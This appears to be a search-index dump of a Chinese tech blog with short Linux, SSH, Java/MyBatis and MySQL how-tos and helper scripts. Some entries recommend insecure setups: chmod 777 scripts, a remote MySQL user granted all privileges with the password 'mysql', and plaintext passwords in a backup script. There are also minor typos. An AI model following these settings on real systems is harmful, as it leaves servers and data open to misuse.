echo &#34;alias pc=&#39;proxychains&#39;&#34; &gt;&gt; ~/.bashrc source ~/.bashrc [root@fedora ~]# pc curl cip.cc [proxychains] config file found: /etc/proxychains.conf [proxychains] preloading /usr/lib64/proxychains-ng/libproxychains4.so [proxychains] DLL init: proxychains-ng 4.16 [proxychains] Strict chain ... 192.168.211.99:20170 ... 122.51.162.249:80 ... OK IP : 198.23.149.5 地址 : 美国 华盛顿州 西雅图 运营商 : colocrossing.com 数据二 : 美国 | 纽约州伊利县威廉斯维尔村ColoCrossing有限公司 数据三 : 美国华盛顿西雅图 URL : http://www.cip.cc/198.23.149.5 2.8 设置局域网使用 3. 浏览器代理 SwitchyOmega 等浏览器插件可为浏览器提供代理服务。   ]]></content></entry><entry><title>Linux配置环境变量的建议</title><url>/posts/linux%E6%93%8D%E4%BD%9C/linux-%E9%85%8D%E7%BD%AE%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E7%9A%84%E5%BB%BA%E8%AE%AE/</url><categories><category>Linux</category></categories><tags><tag>Linux</tag></tags><content type="html"> 若是普通用户，则在自己用户目录的.bashrc中配置，若使用了zsh，则在.zshrc中配置
若是root用户，则在/etc/profile.d/中新建一个my_env.sh文件
最后普通用户(source)刷新.bashrc或.zshrc文件，root用户刷新/etc/profile文件
其中$PAHT表示系统的环境变量，: 表示拼接在系统环境变量$PAHT之后
eg: root用户下的my_env.sh文件 #JAVA_HOME export JAVA_HOME=/opt/module/jdk1.8.0_212 export PATH=$PATH:$JAVA_HOME/bin #HADOOP_HOME export HADOOP_HOME=/opt/module/hadoop-3.1.3 export PATH=$PATH:$HADOOP_HOME/bin export PATH=$PATH:$HADOOP_HOME/sbin source /etc/profile 普通用户的.zshrc文件 export PATH=/home/colzry/.local/bin/:$PATH source .zshrc 最后 /etc/environment也可以更改，改完之后注销即可 或者执行下面语句
PATH=&amp;#34;$PATH&amp;#34;</content></entry><entry><title>Linux软件批量卸载</title><url>/posts/linux%E6%93%8D%E4%BD%9C/%E6%89%B9%E9%87%8F%E5%8D%B8%E8%BD%BD/</url><categories><category>Linux</category></categories><tags><tag>Linux</tag></tags><content type="html"> rpm -e `rpm -qa | grep python`</content></entry><entry><title>Linux设置静态IP</title><url>/posts/linux%E6%93%8D%E4%BD%9C/linux%E8%AE%BE%E7%BD%AE%E9%9D%99%E6%80%81ip/</url><categories><category>Linux</category></categories><tags><tag>Linux</tag><tag>静态IP</tag></tags><content type="html"><![CDATA[  Centos 编辑em1对应的配置文件，位于/etc/sysconfig/network-scripts/ifcfg-你的网卡名字 vim /etc/sysconfig/network-scripts/ifcfg-eth0 主要修改BOOTPROTO, IPADDR, NETMASK, GATEWAY也就是带注释的内容
# Generated by dracut initrd NAME=&#34;eth0&#34; HWADDR=&#34;52:54:00:e1:fa:43&#34; ONBOOT=yes NETBOOT=yes UUID=&#34;d30acbe4-f24c-40d2-be6a-f474d8b7d3f2&#34; IPV6INIT=yes BOOTPROTO=&#34;static&#34; # 使用静态IP，默认为dhcp IPADDR=&#34;192.168.0.100&#34; # 静态IP NETMASK=&#34;255.255.255.0&#34; # 子网掩码 GATEWAY=&#34;192.168.0.1&#34; # 网关 TYPE=Ethernet 保存后重启网络服务
service network restart Almalinux vim /etc/NetworkManager/system-connections/ens18.nmconnection nmcli c reload nmcli c down ens18 &amp;&amp; nmcli c up ens18 Debian 首选备份原始的网络配置文件，
sudo cp /etc/network/interfaces /etc/network/interfacesbak 编辑文件 /etc/network/interfaces，内容如下：
auto lo auto eth0 # 设置开机自动连接网络 iface lo inet loopback allow-hotplug eth0 iface eth0 inet static # static表示使用固定IP地址上网，dhcp表示使用动态ip address 192.168.9.100 # 设置静态ip地址 netmask 255.255.255.0 # 子网掩码 gateway 192.168.9.254 # 网关 保存后重启网络服务
service networking restart Ubuntu 更改/etc/netplan/*.yaml下的yaml文件
vim /etc/netplan/00-installer-config.yaml # This is the network config written by &#39;subiquity&#39; network: ethernets: enp1s0: dhcp4: no # 关闭dhcp addresses: [192.168.0.200/24] # 设置IP和掩码 gateway4: 192.168.0.1 # 网关 nameservers: # 设置DNS addresses: [192.168.0.1, 114.114.114.114] version: 2 保存后使用netplan命令应用最近的网络更改
netplan apply   ]]></content></entry><entry><title>Linux输入输出重定向</title><url>/posts/linux%E6%93%8D%E4%BD%9C/linux%E8%BE%93%E5%85%A5%E8%BE%93%E5%87%BA%E9%87%8D%E5%AE%9A%E5%90%91/</url><categories><category>Linux</category></categories><tags><tag>Linux</tag></tags><content type="html"><![CDATA[  说明 0 标准输入 1 标准输出 2 标准错误 下面命令表示把输出结果重定向到file文件中，而错误重定向到标准输出，此时的标准输出为重定向到file文件中，所以错误也会输出到file文件中
command &gt; file 2&gt;&amp;1 解释 何2&gt;&amp;1要写在后面？
command &gt; file 2&gt;&amp;1
首先是command &gt; file将标准输出重定向到file中， 2&gt;&amp;1 是标准错误拷贝了标准输出的行为，也就是同样被重定向到file中，最终结果就是标准输出和错误都被重定向到file中。
command 2&gt;&amp;1 &gt;file
2&gt;&amp;1 标准错误拷贝了标准输出的行为，但此时标准输出还是在终端。&gt;file 后输出才被重定向到file，但标准错误仍然保持在终端。
用strace可以看到：
command &gt; file 2&gt;&amp;1 这个命令中实现重定向的关键系统调用序列是：
open(file) == 3
dup2(3,1)
dup2(1,2)
command 2&gt;&amp;1 &gt;file 这个命令中实现重定向的关键系统调用序列是：
dup2(1,2)
open(file) == 3
dup2(3,1)
为什么会有&amp;
当没有&amp;时，1会被认为是一个普通的文件，有&amp;表示重定向的目标不是一个文件，而是一个文件描述符。
为什么有&amp;1而没有&amp;2
2&gt;是一个整体，表示标准错误输出重定向，重定向至&amp;1，即标准输出，&amp;1是一个文件
常用命令 挂入后台命令
# 普通 断开终端就停止 command &gt;/dev/null 2&gt;&amp;1 &amp; # 高级 断开终端不停止 nohup command &gt;/dev/null 2&gt;&amp;1 &amp; # 或者 nohup command &gt;&amp; /dev/null &amp; 其他写法 command &gt; file 2&gt;&amp;1 等价写法 command &gt;&amp; file command &amp;&gt; file   ]]></content></entry><entry><title>Linux隧道脚本</title><url>/posts/ssh/linux%E9%9A%A7%E9%81%93%E8%84%9A%E6%9C%AC/</url><categories><category>SSH</category></categories><tags><tag>隧道</tag></tags><content type="html"><![CDATA[  #!/bin/bash remote_ip=43.142.174.216 remote_user=&#34;colzry&#34; # 默认转发的目标ip tran_addr=127.0.0.1 # 默认访问的远程端口号 remote_port=5408 if [ $# -lt 1 ] then echo -e &#39;后面至少要有转发的端口号\n&#39; exit fi # 转发的目标端口 tarn_port=$1 echo &#34;要转发的端口为 $tarn_port &#34; echo -e &#34;\n ===========开始转发================ \n&#34; echo &#34;访问地址 $remote_ip:$remote_port&#34; ssh -N -g -R $remote_port:$tran_addr:$tarn_port $remote_user@$remote_ip   ]]></content></entry><entry><title>Linux文件恢复</title><url>/posts/linux%E6%93%8D%E4%BD%9C/%E6%96%87%E4%BB%B6%E6%81%A2%E5%A4%8D/</url><categories><category>Linux</category></categories><tags><tag>Linux</tag><tag>工具使用</tag></tags><content type="html"> https://bbs.huaweicloud.com/blogs/345168 dd命令 https://blog.csdn.net/hezhanran/article/details/122662675 文件测速
hdparm -t /dev/sdxx</content></entry><entry><title>Linux文件拷贝</title><url>/posts/linux%E6%93%8D%E4%BD%9C/linux%E6%96%87%E4%BB%B6%E6%8B%B7%E8%B4%9D/</url><categories><category>Linux</category></categories><tags><tag>Linux</tag></tags><content type="html"><![CDATA[  scp 推送 scp -r 文件名 目标用户@主机名(host):目标目录 [colzry@hadoop102 ~]$ cd /opt/module/ [colzry@hadoop102 module]$ pwd /opt/module [colzry@hadoop102 module]$ ll 总用量 0 drwxr-xr-x. 9 colzry root 149 9月 12 2019 hadoop-3.1.3 drwxr-xr-x. 7 colzry root 245 4月 2 2019 jdk1.8.0_212 [colzry@hadoop102 module]$ scp -r jdk1.8.0_212/ colzry@hadoop103:/opt/module/ 拉取 scp -r 目标用户@主机名(host):目标目录 放置目录 [colzry@hadoop103 module]$ scp -r colzry@hadoop102:/opt/module/hadoop-3.1.3 ./ 中转 scp -r 目标用户@主机名(host):目标目录 目标用户@主机名(host):目标目录 [colzry@hadoop103 module]$ scp -r colzry@hadoop102:/opt/module/* colzry@hadoop104:/opt/module/ rsync(推荐使用) rsync -av 文件名 目标用户@主机名(host):目标目录 rsync -av 目标用户@主机名(host):目标目录 目标目录 rsync -av 目标用户@主机名(host):目标目录 目标用户@主机名(host):目标目录 集群分发脚本 #!/bin/bash #1. 判断参数个数 if [ $# -lt 1 ] then echo Not Enough Arguement! exit; fi #2. 遍历集群所有机器 for host in hadoop102 hadoop103 hadoop104 do echo ==================== $host ==================== #3. 遍历所有目录，挨个发送 for file in $@ do #4. 判断文件是否存在 if [ -e $file ] then #5. 获取父目录 pdir=$(cd -P $(dirname $file); pwd) #6. 获取当前文件的名称 fname=$(basename $file) ssh $host &#34;mkdir -p $pdir&#34; rsync -av $pdir/$fname $host:$pdir else echo $file does not exists! fi done done 使用方法 cd ~ mkdir bin vim xsync // 填入上面脚本内容 chmod 777 xsync xsync /etc/profile.d/my_env.sh 集群状态查看脚本 #!/bin/bash # 获取控制台指令 # 判断指令是否为空 if [ $# -lt 1 ] then echo &#34;command can not be null !&#34; exit fi # 获取当前登录用户 user=`whoami` source /etc/profile # 在从机执行指令,这里需要根据你具体的集群情况配置，host与具体主机名一致 for host in hadoop101 hadoop102 hadoop103 do echo ================ $host================= ssh $user@$host $@ done echo =========================================== 使用方法 cd ~ mkdir bin vim xcall // 填入上面脚本内容 chmod 777 xcall xcall jps   ]]></content></entry><entry><title>Linux用户的管理</title><url>/posts/linux%E6%93%8D%E4%BD%9C/linux-%E7%94%A8%E6%88%B7%E7%AE%A1%E7%90%86/</url><categories><category>Linux</category></categories><tags><tag>Linux</tag></tags><content type="html"> Linux 用户管理 一.用户管理命令 通过系统中的命令对用户进行相应的操作。在讲解命令之前，我们需要了解，在linux操作系统中，以下的几个概念：
UID：用户ID号，用户的唯一标识号，就相当于一个人的身份证号。 所属用户组：在linux操作系统中，一个用户必须有它的用户组，如果不给新用户指定用户组，那么该会默认创建一个与用户名相同的组。 GID：用户组的ID号。 家目录:与Windows系统相同，可理解为一个用户的用户文件夹，所有用户的家目录默认被创建在 /home 目录下。相当于Windows操作系统中的 C:/Users 目录。 1.1 创建用户 通过 useradd 命令来创建新的用户。
语法格式： useradd [参数] &amp;amp;lt;用户名&amp;amp;gt;
常用参数：
参数 作用 -u 指定用户UID -d 指定用户家目录位置 -c 添加用户说明/备注 -g 指定用户初始所属的用户组 -G 指定用户所属附加组 -s 指定用户登录的shell解释器 操作演示：
添加新用户 xiaobei
[root@localhost ~]# useradd xiaobei 添加新用户 test01 并且指定其家目录为 /test/test01
[root@localhost ~]# useradd -d /test/test01 test01 添加新用户 test01 并且指定ID为6666
[root@localhost ~]# useradd -u 6666 test01 添加新用户 test01 并且指定其所属组为root，并设置其登录shell为nologin
[root@localhost ~]# useradd -g root -s /sbin/nologin test01 1.2 设置密码 通过passwd命令来设置当前登录用户(自身)或者其他用户的密码。该命令如果不加用户名，即代表对当前登录的用户进行操作。不加参数，代表设置密码。这里我们需要知道，通常创建用户都是root来做的，所以设置密码也都是root用户身份来进行设置。如果是普通用户想设置root用户的密码，怎么办呢？不是不可以，只是该普通用户必须拥有sudo权限。本文我们只需要理解可以这么做就好。
语法格式： passwd [参数] [用户名]
常用参数：
参数 作用 -d 删除密码 -S 查询用户密码的状 …</content></entry><entry><title>Maven快速入门</title><url>/posts/java/maven-%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8/</url><categories><category>Java</category></categories><tags><tag>Java</tag><tag>Maven</tag></tags><content type="html"><![CDATA[  Maven的作用 项目的自动构建，帮助开发人员做项目代码的编译，测试， 打包，安装，部署等工作。 管理依赖（管理项目中使用的各种jar包）。 依赖：项目中需要使用的其他资源， 常见的是jar 。 比如项目要使用mysql驱动。我们就说项目依赖mysql驱动。 Maven 安装 确定JAVA_HOME 指定jdk的安装目录， 如果没有JAVA_HOME， 需要在windows的环境变量中创建JAVA_HOME, 它的值是jdk的安装目录 解压缩 apache-maven-3.3.9-bin.zip ，把解压后的文件放到一个目录中。 目录的路径不要有中文，不要有空格。 把maven安装目录中下的bin的路径添加到path中 测试maven的安装。 在命令行执行 mvn -v C:\Users\NING MEI&amp;gt;mvn -v Apache Maven 3.3.9 (bb52d8502b132ec0a5a3f4c09453c07478323dc5; 2015-11-11T00:41:47+08:00) Maven home: D:\tools\apache-maven-3.3.9\bin\.. Java version: 1.8.0_101, vendor: Oracle Corporation Java home: C:\Program Files\Java\jdk1.8.0_101\jre Default locale: zh_CN, platform encoding: GBK OS name: &amp;#34;windows 10&amp;#34;, version: &amp;#34;10.0&amp;#34;, arch: &amp;#34;amd64&amp;#34;, family: &amp;#34;dos&amp;#34; maven解压后的目录结构 maven的其他安装方式：
确定JAVA_HOME是否有效 在环境变量中，创建一个叫做M2_HOME (或者MAVEN_HOME) ，它的值是maven的安装目录 M2_HOME=D:\tools\apache-maven-3.3.9 在path环境变量中，加入 %M2_HOME%\bin 测试maven的安装，在命令行执行 mvn -v C:\Users\NING MEI&amp;gt;mvn -v Apache Maven 3.3.9 …  ]]></content></entry><entry><title>MyBatisPlus分页</title><url>/posts/%E4%B8%BB%E6%B5%81%E6%A1%86%E6%9E%B6%E5%92%8C%E4%B8%AD%E9%97%B4%E4%BB%B6/mybatisplus-%E5%88%86%E9%A1%B5/</url><categories><category>框架和中间件</category></categories><tags><tag>MyBatisPlus</tag></tags><content type="html"><![CDATA[  1. 添加分页插件 @Configuration public class MybatisPlusConfig { /** * 分页插件 * @return */ @Bean public MybatisPlusInterceptor mybatisPlusInterceptor() { MybatisPlusInterceptor interceptor = new MybatisPlusInterceptor(); interceptor.addInnerInterceptor(new PaginationInnerInterceptor()); return interceptor; } } 2. 使用 先定义PageParam
@Data @AllArgsConstructor @NoArgsConstructor public class PageParam { private int page = 1; private int pageSize = 10; } 2.1 使用mapper分页 @Autowired private DeptMapper deptMapper; @Override public Result getDeptList(PageParam pageParam) { Page&lt;Dept&gt; page = new Page&lt;Dept&gt;(pageParam.getPage(), pageParam.getPageSize()); deptMapper.selectPage(page, null); return Result.success(page); } 2.2 使用service分页 @Autowired private DeptServiceImpl deptService; @PostMapping(&#34;list&#34;) public Result deptPage(@RequestBody PageParam pageParam) { Page&lt;Dept&gt; page = new Page&lt;&gt;(pageParam.getPage(), pageParam.getPageSize()); return Result.success(deptService.page(page)); } 2.3 自定义分页 &lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34; ?&gt; &lt;!DOCTYPE mapper PUBLIC &#34;-//mybatis.org//DTD Mapper 3.0//EN&#34; &#34;http://mybatis.org/dtd/mybatis-3-mapper.dtd&#34; &gt; &lt;mapper namespace=&#34;com.colzry.oasystemserver.mapper.EmployeeMapper&#34;&gt; &lt;sql id=&#34;empVo&#34;&gt; ${empTable}.id, emp_no, emp_name, emp_gender, emp_entry_time, dept_name &lt;/sql&gt; &lt;select id=&#34;queryBaseEmpPage&#34; resultType=&#34;com.colzry.oasystemserver.vo.EmployeeVO&#34;&gt; select &lt;include refid=&#34;empVo&#34;&gt; &lt;property name=&#34;empTable&#34; value=&#34;oa_employee&#34;/&gt; &lt;/include&gt; from oa_employee left join oa_dept on oa_employee.emp_dept_id = oa_dept.id &lt;/select&gt; &lt;select id=&#34;queryBaseEmpPageByDept&#34; resultType=&#34;com.colzry.oasystemserver.vo.EmployeeVO&#34;&gt; select &lt;include refid=&#34;empVo&#34;&gt; &lt;property name=&#34;empTable&#34; value=&#34;oa_employee&#34;/&gt; &lt;/include&gt; from oa_employee left join oa_dept on oa_employee.emp_dept_id = oa_dept.id where oa_dept.id = #{deptId} &lt;/select&gt; &lt;/mapper&gt; @Mapper @Repository public interface EmployeeMapper extends BaseMapper&lt;Employee&gt; { IPage&lt;EmployeeVO&gt; queryBaseEmpPage(IPage&lt;EmployeeVO&gt; page); IPage&lt;EmployeeVO&gt; queryBaseEmpPageByDept(IPage&lt;EmployeeVO&gt; page,@Param(&#34;deptId&#34;) Long deptId); } @Autowired private EmployeeMapper employeeMapper; @Override public Result getBaseEmpList(PageParam pageParam) { Page&lt;EmployeeVO&gt; page = new Page&lt;&gt;(pageParam.getPage(), pageParam.getPageSize()); IPage&lt;EmployeeVO&gt; empPage = employeeMapper.queryBaseEmpPage(page); return Result.success(empPage); } @Override public Result getEmpListByDept(PageParam pageParam, Long deptId) { Page&lt;EmployeeVO&gt; page = new Page&lt;&gt;(pageParam.getPage(), pageParam.getPageSize()); IPage&lt;EmployeeVO&gt; employeeVOPage = employeeMapper.queryBaseEmpPageByDept(page, deptId); return Result.success(employeeVOPage); }   ]]></content></entry><entry><title>MyBatis教程</title><url>/posts/%E4%B8%BB%E6%B5%81%E6%A1%86%E6%9E%B6%E5%92%8C%E4%B8%AD%E9%97%B4%E4%BB%B6/mybatis%E6%95%99%E7%A8%8B/</url><categories><category>框架和中间件</category></categories><tags><tag>MyBatis</tag></tags><content type="html"><![CDATA[  码神之路之Mybatis教程 ORM是什么？
为什么要将JDBC封装为Mybatis？
怎么使用Mybatis实现增删改查？
sql注入？
标签，标签，标签，标签等标签的使用?
Mybatis如何实现分页?
Mybatis分页插件的使用?
Mybatis的原理?
目录 JDBC实现过程
JDBC的问题
JDBC演变为Mybatis
Mybatis的使用
Mybatis的原理
后续讲解
在spring阶段讲解和Mybatis的整合 在springboot阶段 讲解和Mybatis的整合 Mybatis-plus的使用 1. JDBC实现过程 1.1 步骤 我们最熟悉也是最基础的通过JDBC查询数据库数据，一般需要以下七个步骤：
加载JDBC驱动； 建立并获取数据库连接； 创建 JDBC Statements 对象； 设置SQL语句的传入参数； 执行SQL语句并获得查询结果； 对查询结果进行转换处理并将处理结果返回； 释放相关资源（关闭Connection，关闭Statement，关闭ResultSet）； 1.2 代码 1.2.1 新建maven工程 &amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;UTF-8&amp;#34;?&amp;gt; &amp;lt;project xmlns=&amp;#34;http://maven.apache.org/POM/4.0.0&amp;#34; xmlns:xsi=&amp;#34;http://www.w3.org/2001/XMLSchema-instance&amp;#34; xsi:schemaLocation=&amp;#34;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&amp;#34;&amp;gt; &amp;lt;modelVersion&amp;gt;4.0.0&amp;lt;/modelVersion&amp;gt; &amp;lt;groupId&amp;gt;com.xiaopizhu&amp;lt;/groupId&amp;gt; &amp;lt;artifactId&amp;gt;mybatisDemo&amp;lt;/artifactId&amp;gt; &amp;lt;version&amp;gt;1.0-SNAPSHOT&amp;lt;/version&amp;gt; &amp;lt;dependencies&amp;gt; &amp;lt;!-- mybatis …  ]]></content></entry><entry><title>MyBatis使用示例</title><url>/posts/java/mybatis%E4%BD%BF%E7%94%A8%E7%A4%BA%E4%BE%8B/</url><categories><category>Java</category></categories><tags><tag>Java</tag><tag>MyBatis</tag></tags><content type="html"><![CDATA[  什么是 MyBatis？ MyBatis 是一款优秀的持久层框架，它支持自定义 SQL、存储过程以及高级映射。MyBatis 免除了几乎所有的 JDBC 代码以及设置参数和获取结果集的工作。MyBatis 可以通过简单的 XML 或注解来配置和映射原始类型、接口和 Java POJO（Plain Old Java Objects，普通老式 Java 对象）为数据库中的记录。
创建MyBatis项目 使用 IDEA 建立一个 SpringBoot 项目，初始化组件部分选择 Web、JDBC API、MyBatis Framework、MySQL Driver
若创建失败或者创建太慢，可以更换阿里镜像： https://start.aliyun.com 创建数据库 CREATE DATABASE IF NOT EXISTS mybatis; USE mybatis; 其对应的数据库 Schema 脚本如下：
DROP TABLE IF EXISTS user; CREATE TABLE user ( id BIGINT(20) NOT NULL COMMENT &#39;主键ID&#39;, name VARCHAR(30) NULL DEFAULT NULL COMMENT &#39;姓名&#39;, age INT(11) NULL DEFAULT NULL COMMENT &#39;年龄&#39;, email VARCHAR(50) NULL DEFAULT NULL COMMENT &#39;邮箱&#39;, PRIMARY KEY (id) ); 其对应的数据库 Data 脚本如下：
INSERT INTO user (id, name, age, email) VALUES (1, &#39;Jone&#39;, 18, &#39;test1@baomidou.com&#39;), (2, &#39;Jack&#39;, 20, &#39;test2@baomidou.com&#39;), (3, &#39;Tom&#39;, 28, &#39;test3@baomidou.com&#39;), (4, &#39;Sandy&#39;, 21, &#39;test4@baomidou.com&#39;), (5, &#39;Billie&#39;, 24, &#39;test5@baomidou.com&#39;); 创建对应的程序目录和类 controller层负责具体的业务模块流程的控制 dao层主要是做数据持久层的工作，负责与数据库联络，封装了增删改查基本操作 entity层用于存放我们的实体类，与数据库中的属性值基本保持一致，实现set和get的方法 service层主要负责业务模块的逻辑应用设计，具体要调用到已定义的DAO层的接口 package com.colzry.mybatis.entity; import lombok.Data; @Data public class User { private Integer id; private String name; private Integer age; private String email; } package com.colzry.mybatis.dao; import com.colzry.mybatis.entity.User; import org.apache.ibatis.annotations.Mapper; import org.apache.ibatis.annotations.Param; import org.apache.ibatis.annotations.Select; import org.springframework.stereotype.Repository; import java.util.List; @Mapper @Repository public interface UserDao { @Select(&#34;select * from user where id=#{id}&#34;) public User getUserById(@Param(&#34;id&#34;) Integer id); @Select(&#34;select * from user where age &gt;= #{age}&#34;) public List&lt;User&gt; getUserByGtAge(@Param(&#34;age&#34;) int age); } package com.colzry.mybatis.service; import com.colzry.mybatis.dao.UserDao; import com.colzry.mybatis.entity.User; import org.springframework.beans.factory.annotation.Autowired; import org.springframework.stereotype.Service; import java.util.List; @Service public class UserService { @Autowired private UserDao userDao; public User queryUser(int id) { return userDao.getUserById(id); } public List&lt;User&gt; queryUser01(int age) { return userDao.getUserByGtAge(age); } } package com.colzry.mybatis.controller; import com.colzry.mybatis.entity.User; import com.colzry.mybatis.service.UserService; import org.springframework.beans.factory.annotation.Autowired; import org.springframework.web.bind.annotation.RequestMapping; import org.springframework.web.bind.annotation.RequestParam; import org.springframework.web.bind.annotation.RestController; import java.util.List; @RestController public class UserController { @Autowired private UserService userService; @RequestMapping(&#34;/user&#34;) public User getUser(@RequestParam(&#34;id&#34;) int id) { return userService.queryUser(id); } @RequestMapping(&#34;/user01&#34;) public List&lt;User&gt; getUserByAge(@RequestParam(&#34;age&#34;) int age) { return userService.queryUser01(age); } } 编写配置文件 对应的application.yml文件
server: port: 9090 spring: datasource: driver-class-name: com.mysql.cj.jdbc.Driver url: jdbc:mysql://localhost:3306/mybatis?serverTimezone=UTC username: mybatis password: 123456 mybatis: mapper-locations: classpath:/mappers/*.xml type-aliases-package: com.colzry.mybatis.entity 运行项目 运行MyBatisApplication主程序
在浏览器中访问本地的9090端口，输入以下两个内容进行测试
http://localhost:9090/user?id=1 http://localhost:9090/user01?age=18   ]]></content></entry><entry><title>mycli的安装和使用</title><url>/posts/mysql/mycli%E7%9A%84%E5%AE%89%E8%A3%85%E5%92%8C%E4%BD%BF%E7%94%A8/</url><categories><category>MySQL</category></categories><tags><tag>MySQL</tag></tags><content type="html"> 1. 安装 dnf install python3 pip3 install mycli 2. 使用 mycli -u user -h host database</content></entry><entry><title>MySQL对用户的管理</title><url>/posts/mysql/mysql%E5%AF%B9%E7%94%A8%E6%88%B7%E7%9A%84%E7%AE%A1%E7%90%86/</url><categories><category>MySQL</category></categories><tags><tag>MySQL</tag></tags><content type="html"><![CDATA[  1. 查看用户 use mysql; select * from user; 示例
kylin@kylin:~$ mysql -u root -p Enter password: Welcome to the MySQL monitor. Commands end with ; or \g. Your MySQL connection id is 14 Server version: 5.7.33 MySQL Community Server (GPL) Copyright (c) 2000, 2021, Oracle and/or its affiliates. Oracle is a registered trademark of Oracle Corporation and/or its affiliates. Other names may be trademarks of their respective owners. Type &#39;help;&#39; or &#39;\h&#39; for help. Type &#39;\c&#39; to clear the current input statement. mysql&gt; show databases; +--------------------+ | Database | +--------------------+ | information_schema | | mysql | | performance_schema | | sys | +--------------------+ 4 rows in set (0.00 sec) mysql&gt; use mysql; Reading table information for completion of table and column names You can turn off this feature to get a quicker startup with -A Database changed mysql&gt; select * from user; 2. 创建用户 create user &#39;user_name&#39;@&#39;host&#39; identified by &#39;passwd&#39;; user_name 表示要创建的用户名 host 表示新创建的用户允许从哪台机器登录，&rsquo;localhost&rsquo;表示本机登录，&rsquo;%&rsquo; 表示远程登录 passwd 表示新用户的密码
示例
// 用户名为 mysql 只允许从本地登录 密码为 mysql create user &#39;mysql&#39;@&#39;localhost&#39; identified by &#39;mysql&#39;; // 用户名为 mysql 允许远程登录 密码为 mysql create user &#39;mysql&#39;@&#39;%&#39; identified by &#39;mysql&#39;; 3. 授权用户 grant privileges on database_name.table_name to &#39;user_name&#39;@&#39;host&#39;; privileges 表示要授予的权力，有 **select，insert，delete，update **等，如果要授予全部权力，就填 all database_name.table_name 表示用户的权限能在某库某表中使用，如果要作用于数据库中的所有表，则填 . user_name 表示授权的用户 host 可填 localhost 或 %
示例
// 给test用户授予employee库job表的插入和查询权限 grant inster,select on employess.job to &#39;test&#39;@&#39;%&#39;; // 给mysql用户授予所有库所有表的所示权限 grant all on *.* to &#39;mysql&#39;@&#39;%&#39;; 提示：如果当前是普通用户在执行命令则不能给其他用户授权，要想授权，需要在后面加上 with grant option
grant all on *.* to &#39;mysql&#39;@&#39;%&#39; with grant option; 4. 更改用户的登录方式和密码 将本地登录改为可远程登录
use mysql; // 其中user_name为要更改的用户名 update user set host=&#39;%&#39; where user = &#39;user_name&#39;; // 刷新权限 flush privileges; 更改密码
// 法一 // user_name为要更改的用户名 new_passwd为要更改的密码 set password for user_name@localhost = password(&#39;new_passwd&#39;); // 法二 // name为要更改的用户名 new_passwd为要更改的密码 set password=password(&#39;new_passwd&#39;); grant all on *.* to &#39;user_name&#39;@&#39;%&#39; identified by &#39;new_passwd&#39;; flush privileges; 5. 撤销用户的权限 revoke privileges on database_name.table_name from &#39;user_name&#39;@&#39;host&#39;; 6. 删除用户 drop user &#39;usre_name&#39;@&#39;host&#39;;   ]]></content></entry><entry><title>MySQL入门</title><url>/posts/mysql/mysql%E5%85%A5%E9%97%A8/</url><categories><category>MySQL</category></categories><tags><tag>MySQL</tag></tags><content type="html"> 1. MySQL的介绍 1.1 MySQL的背景 前身属于瑞典的一家公司，MySQL AB 08年被sun公司收购 09年sun被oracle收购
1.2 MySQL的优点 1、开源、免费、成本低 2、性能高、移植性也好 3、体积小，便于安装
2. 准备操作 win10安装 Linux安装 打开管理员控制台
mysql -u root -p 查看数据库
show databases; 选择要操作的数据库
use 库名; 看看该库里面的表
show tables; 查看某个表的结构
desc 表名; 3. 查询语言的分类 在了解 SQL 之前我们需要知道下面这几个概念
数据定义语言：简称DDL (Data Definition Language)，用来定义数据库对象:数据库、表、列等； 数据操作语言：简称DML (Data Manipulation Language)，用来对数据库中表的记录进行更新。关键字：insert、update、delete等 数据控制语言：简称DCL(Data Control Language)，用来定义数据库访问权限和安全级别，创建用户等。关键字：grant等 数据查询语言：简称DQL(Data Query Language)，用来查询数据库中表的记录，关键字：select from where等 4. DDL语言 4.1 库的管理 注：方括号内的为选填内容【选填内容】
4.1.1 创建数据库 create database 【if not exists】 库名; 4.1.2 修改数据库 alter database 库名 character set 字符集名; 查看MYSQL数据库服务器和数据库字符集 show variables like &amp;amp;#39;%character%&amp;amp;#39;; 查看MYSQL所支持的字符集 show charset; 4.1.3 删除数据库 drop database 【if exists】 库名; 4.2 表的管理 在这之前先了解一下字段类型和约束
4.2.1 字段类型 整型 类型名称 所占字节大小 tinyint 1 byte smallint 2 byte mediumint 3 byte int/integer 4 byte bigint 8 byte 特点： ①都可以设置无符号和有符号，默认有符号，通 …</content></entry><entry><title>MySQL数据库的备份和恢复</title><url>/posts/mysql/mysql%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E5%A4%87%E4%BB%BD%E5%92%8C%E6%81%A2%E5%A4%8D/</url><categories><category>MySQL</category></categories><tags><tag>MySQL</tag></tags><content type="html"><![CDATA[  1. 备份 1.1创建备份脚本 在/usr/local/sbin/下新建mysql_backup.sh
sudo vim /usr/local/sbin/mysql_backup.sh 填入下面的内容
#!/bin/bash bakdir=/data/back # 定义备份文件存放目录 d=`date +%F` # 以日期(Y-M-D)为命名格式 user=colzry # 数据库用户名 (!自行更改) passwd=passwd # 密码 (!自行更改) # 备份两个数据库 typecho lsky (!自行更改) # 若要备份所以的数据库,则下面的整条for语句改为下面注释的内容 # mysqldump -u$user -p$passwd -A &gt; $bakdir/$db\_$d.sql for db in typecho lsky do mysqldump -u$user -p$passwd $db &gt; $bakdir/$db\_$d.sql done cd $bakdir # 对备份文件进行压缩 gzip *_$d.sql # 对备份时间超过一个月的文件进行删除 find ./ -name &#34;*.gz&#34; -mtime +30 | xargs rm -f 1.2 创建定时任务 用法 格式为 :
* * * * * 分 时 天 月 周 示例:
*/1 * * * * Command 每f分钟执行 0 */1 * * * Command 每小时执行 5 * * * * Command 每小时的第5分钟执行一次命令 30 18 * * * Command 指定每天下午的 6:30 执行一次命令 30 7 8 * * Command 指定每月8号的7：30分执行一次命令 30 5 8 6 * Command 指定每年的6月8日5：30执行一次命令 30 6 * * 0 Command 指定每星期日的6:30执行一次命令 crontab -e 编辑某个用户的cron服务 crontab -l 列出某个用户cron服务的详细内容 1.3 开始创建定时任务 sudo crontab -e # 每天凌晨3:30执行数据库的备份 30 3 * * * /bin/bash /usr/local/sbin/mysql_back.sh 2. 恢复 来到备份的目录
